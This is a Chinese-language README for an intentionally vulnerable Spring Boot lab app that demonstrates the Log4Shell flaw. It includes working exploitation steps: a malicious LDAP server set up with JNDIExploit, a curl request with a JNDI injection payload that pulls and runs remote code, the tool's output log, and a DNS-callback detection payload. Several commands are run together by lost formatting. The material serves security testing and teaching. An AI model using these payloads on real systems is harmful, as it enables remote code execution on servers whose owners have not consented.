该存储库包含一个易受 CVE-2021-44228 攻击的 Spring Boot Web 应用程序，昵称Log4Shell。

它使用 Log4j 2.14.1（到spring-boot-starter-log4j22.6.1）和 JDK 1.8.0_181。

运行应用程序

运行：

docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app

自己构建（您不需要任何与 Java 相关的工具）：

docker build . -t vulnerable-appdocker run -p 8080:8080 --name vulnerable-app vulnerable-app


开发步骤

注意：这是从最初的LunaSec 咨询中得到高度启发的。运行风险自负，最好在沙盒环境中的 VM 中运行。

  • 使用JNDIExploit启动恶意 LDAP 服务器

wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zipunzip JNDIExploit.v1.2.zipjava -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888

  • 然后，使用以下命令触发漏洞利用：

# will execute 'touch /tmp/pwned'curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

  • 请注意 JNDIExploit 的输出，显示它已发送恶意 LDAP 响应并提供第二阶段有效负载：

[+] LDAP Server Start Listening on 1389...[+] HTTP Server Start Listening on 8888...[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo[+] Paylaod: command[+] Command: touch /tmp/pwned
[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class[+] Receive ClassRequest: Exploitjkk87OnvOH.class[+] Response Code: 200

  • 要确认代码执行成功，请注意该文件/tmp/pwned.txt是在运行易受攻击的应用程序的容器中创建的：

$ docker exec vulnerable-app ls /tmp...pwned...


如何识别 log4漏洞。

使用 DNS 记录器（例如dnslog.cn），您可以生成一个域名并在您的测试负载中使用它：

 ${jndi:ldap://xxx.dnslog.cn/a}

Apache Log4j 远程代码执行 POC 有一段是WAF版，测试直接到http://114.67.175.224:18232/靶场环境。输入框输入：${jndi:ldap://填写子域/a}

返回结果证明漏洞存在


刷新页面将显示 DNS 查询，这些查询标识了触发漏洞的主机。
